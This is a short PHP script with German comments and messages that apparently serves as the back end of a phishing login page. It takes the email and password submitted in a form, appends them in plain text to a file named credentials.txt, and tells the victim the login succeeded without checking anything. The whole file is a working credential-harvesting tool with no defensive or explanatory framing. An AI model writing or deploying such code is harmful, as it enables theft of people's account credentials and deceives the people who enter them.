<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Speichere die Daten in einer Datei
    file_put_contents('credentials.txt', "Email: $email\nPassword: $password\n", FILE_APPEND);

    echo "Anmeldung erfolgreich!";
} else {
    echo "Ungültige Anfrage!";
}
?>